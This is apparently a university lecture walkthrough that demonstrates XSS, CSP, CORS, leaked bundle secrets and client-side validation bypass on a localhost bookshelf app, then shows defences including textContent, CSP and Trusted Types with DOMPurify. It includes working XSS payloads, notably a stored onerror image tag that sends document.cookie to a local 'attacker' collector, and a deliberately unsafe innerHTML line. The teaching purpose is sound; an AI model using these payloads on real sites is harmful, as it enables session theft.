# Break it, then fix it: Web Security

**CSCI 3230U · Lecture 06a · demo walkthrough**

This is the bookshelf from class 9 (the typed solution), used to show
cross-site scripting (XSS), CORS, and a few other attacks, and the defences
against them. You can rerun everything we did in class on your own machine.

> **Only on `localhost`.** Every attack here targets your own copy of the
> page and sends data to your own machine. Don't try these payloads on
> sites you don't own: that is illegal, not practice.

## What's in this folder

The files are saved **after** the demo, so the defences are on and the
attack is still in the data:

| File | What to look at |
|---|---|
| `src/script.ts` | `bookCard` renders the title with `textContent`. The unsafe `innerHTML` line is commented out right below it. Also has a fake `API_KEY` (step 7). |
| `index.html` | a `Content-Security-Policy` `<meta>` in `<head>` (step 5) |
| `books.json` | book `"5"` has an XSS payload as its title (step 3) |
| `collector.py` | a tiny "attacker's server" that prints whatever is sent to it |

## Setup

You need Node.js and Python 3. Open three terminals in this `demo/` folder:

| # | Command | What it is |
|---|---|---|
| 1 | `npm install`, `npm run build`, `npm run serve` | the site, on `http://localhost:8000` |
| 2 | `npm run watch` | rebuilds `dist/` every time you save (leave it running) |
| 3 | `python3 collector.py` | the attacker's server, on `http://localhost:9000` |

Open `http://localhost:8000` in Chrome, with DevTools open on the
**Console** tab.

`dist/` and `node_modules/` aren't committed. `npm install` and
`npm run build` recreate them.

---

## 1. The safe page

Reload the page. Five books load. The fifth one's title is literally
`<img src=x onerror=...>`: the payload is in the data, but it's shown
**as text** and nothing runs. Terminal 3 stays silent.

That's `textContent` doing its job. It puts characters on the page and
never parses them as HTML.

## 2. Break it: innerHTML

In `src/script.ts`, in `bookCard`, swap the two title lines so the unsafe
one is active:

```ts
  // title.textContent = book.title;
  title.innerHTML = book.title;          // DANGER (on purpose)
```

Save; terminal 2 rebuilds. **This compiles cleanly.** `innerHTML` takes a
string, so TypeScript has nothing to complain about.

> A type system checks the *shape* of your data, not whether you're
> *using* it dangerously. Security is a separate problem.

Reload. The fifth card's title is gone and no cookie is stolen. Check the
Console:

```
Refused to execute inline event handler because it violates the
following Content Security Policy directive: "script-src 'self'".
```

The **CSP** in `index.html` blocked it. Step 5 explains how. For now,
turn it off: comment out the `<meta http-equiv="Content-Security-Policy" ...>`
line in `index.html` and save.

## 3. It's only text... until it isn't

Reload. Use the form to add three books, one title at a time:

| Title you type | What happens | Why |
|---|---|---|
| `<b>bold</b>` | the word **bold**, in bold | `innerHTML` parsed it as a tag |
| `<script>alert(1)</script>` | nothing | `innerHTML` never runs an injected `<script>` |
| `<img src=x onerror="alert('XSS')">` | an alert box pops up | the image fails to load, so `onerror` runs |

Blocking `<script>` is **not** a defence: the third title has no `<script>`
in it. Any attribute that runs code, like `onerror`, is enough. This is
**cross-site scripting**: someone else's code running inside your page,
with your page's permissions.

## 4. Stored XSS and a stolen cookie

In step 3 *you* typed the payload. Real XSS is usually **stored**: it sits
in the data that every visitor loads. Here, that data is book `"5"` in
`books.json`:

```json
"title": "<img src=x onerror=\"new Image().src='http://localhost:9000/?c='+document.cookie\">"
```

When the image fails to load, `onerror` requests an "image" from the
collector, with the page's cookies in the URL.

Give the page a cookie to steal (it doesn't set any itself). In the Console:

```js
document.cookie = "session=abc123";
```

Reload, **without typing anything**. Terminal 3 prints:

```
>>> STOLEN  ?c=session=abc123
```

No one typed anything. The payload came in with the data, ran for every
visitor, and sent the session cookie to a server the attacker controls. On
a real site, that cookie *is* the user's login.

## 5. Two layers of defence

**Layer 1: `textContent`.** Put the safe line back in `src/script.ts`:

```ts
  title.textContent = book.title;
  // title.innerHTML = book.title;
```

Reload. The payload is plain text again, and the collector stays silent.
This is the first and most important rule: **output user data as text,
not HTML.**

**Layer 2: Content-Security-Policy.** People make mistakes, and someone
will add an `innerHTML` later. Switch back to `innerHTML`, then uncomment
the CSP line in `index.html`:

```html
  <meta http-equiv="Content-Security-Policy" content="script-src 'self'">
```

Reload. The payload is blocked with the "Refused to execute inline event
handler" error from step 2, and the app still works, because
`dist/script.js` comes from our own origin (`'self'`).

`script-src 'self'` blocks every inline `<script>` and every inline handler
like `onerror` (unless you add `'unsafe-inline'`, which you shouldn't).
The bug is still there, but the CSP stops it. That's **defence in depth**:
when one layer fails, the next one catches it.

Put `textContent` back before going on.

## 6. CORS: your own page, refused

A different port means a different **origin**. In another terminal in this
folder, run:

```bash
python3 -m http.server 8001
```

Then, in the Console of the page on `:8000`:

```js
fetch("http://localhost:8001/books.json").then(r => r.json()).then(console.log);
```

It fails:

```
Access to fetch at 'http://localhost:8001/books.json' from origin
'http://localhost:8000' has been blocked by CORS policy: No
'Access-Control-Allow-Origin' header is present on the requested resource.
```

This isn't an attack. The browser is protecting the **user**: `:8001`
never said `:8000` is allowed to read its responses. A CORS error is fixed
on the **server** that owns the data. It sends `Access-Control-Allow-Origin`
with the origin of the page that's asking: here, `http://localhost:8000`,
not its own.

## 7. A secret in the bundle

`src/script.ts` has this near the top:

```ts
const API_KEY = "sk_live_abc123"; // pretend secret
```

In DevTools, open **Sources**, then `dist/script.js`, press Ctrl-F, and
search for `sk_live`. There it is.

Everything you ship to the browser is public. Minifying doesn't hide it,
and neither does a `.env` file that gets built into the bundle (for
example, `VITE_*` variables in React/Vite projects). **Secrets stay on the
server.**

## 8. Bypass the UI

The title input has `required`. That's for user experience, not security.
In DevTools **Elements**, select the title `<input>`, delete its `required`
attribute, and submit the form empty. The book is added, because the HTML
attribute was the only check.

Our demo uses a static file server (`python3 -m http.server` only answers
GET/HEAD), so there's no backend to attack here. In a real app the form
would POST to a server, and someone could send that request with `curl`
and skip every check in the browser. **The server must validate
everything again.**

## 9. (Optional) Trusted Types + DOMPurify

This is the strongest layer. It needs a Chromium browser and one package:

```bash
npm install dompurify
```

Extend the CSP so plain strings can't be assigned to `innerHTML` at all:

```html
  <meta http-equiv="Content-Security-Policy"
        content="script-src 'self'; require-trusted-types-for 'script'">
```

With `innerHTML` active, reload. The page now **throws** at the assignment:
`This document requires 'TrustedHTML' assignment`. The only way to make
`TrustedHTML` is through a policy you write. In `src/script.ts`:

```ts
import DOMPurify from "/node_modules/dompurify/dist/purify.es.mjs";

const policy = (window as any).trustedTypes.createPolicy("bookshelf", {
  createHTML: (s: string) => DOMPurify.sanitize(s),
});
// ...then, in bookCard:
title.innerHTML = policy.createHTML(book.title) as unknown as string;
```

Reload. DOMPurify strips the `onerror`, nothing is stolen, and any other
*bare* `innerHTML` anywhere in the app now throws instead of running. You
can't forget to sanitize, because forgetting is an error.

---

## Reset

```bash
git checkout -- src/script.ts index.html books.json
```

Clear the cookie with `document.cookie = "session=; max-age=0";`.

## The five takeaways

1. **Never trust user data**: the client is just the UI, the server is the gate.
2. **XSS** is user input rendered as HTML → `textContent`, sanitize, CSP.
3. **CSRF** is another site using your cookie → `SameSite` cookies, CSRF tokens.
4. **CORS** protects the user; the server opts in by naming *your* origin.
5. **Secrets stay server-side**; keep sessions in `HttpOnly` cookies.
